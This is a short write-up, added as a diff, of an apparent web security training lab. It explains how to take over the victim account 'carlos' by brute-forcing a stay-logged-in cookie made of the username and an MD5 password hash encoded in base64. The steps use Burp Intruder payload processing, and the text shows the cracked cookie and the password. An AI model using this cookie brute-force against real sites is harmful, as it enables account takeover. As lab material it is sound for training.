@@ -1,0 +1,43 @@
+Vulnerable - The cookie is vulnerable to brute-forcing
+
+Goal: Access carlos 'my-account' page
+
+Given information:
+My credentials: Username: wiener , Password: peter
+
+Victim username: carlos
+
+Analysis:
+--------
+
+send the post request for changing the email to the intruder
+-> Post /my-account/change-email HTTP/1.1
+
+stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
+
+decode as base64
+-> d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
+-> wiener:51dc30ddc473d43a6011e9ebba6ca770 -> wiener:peter
+-> username: hash password
+
+select (d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw) as one payload
+
+set the list of password
+
+Under the Payload processing add folowing roles:
+Hash: MD5
+Add prefix: carlos:
+Encode: Base64-encode
+
+The request with (stay-logged-in=Y2FybG9zOmU2YTViYTA4NDJhNTMxMTYzNDI1ZDY2ODM5NTY5YTY4)
+-> length 170
+-> other requests length 165
+
+stay-logged-in=Y2FybG9zOmU2YTViYTA4NDJhNTMxMTYzNDI1ZDY2ODM5NTY5YTY4
+-> carlos:e6a5ba0842a531163425d66839569a68
+-> carlos:matthew
+
+Username: carlos
+Password: matthew
+
+Solved
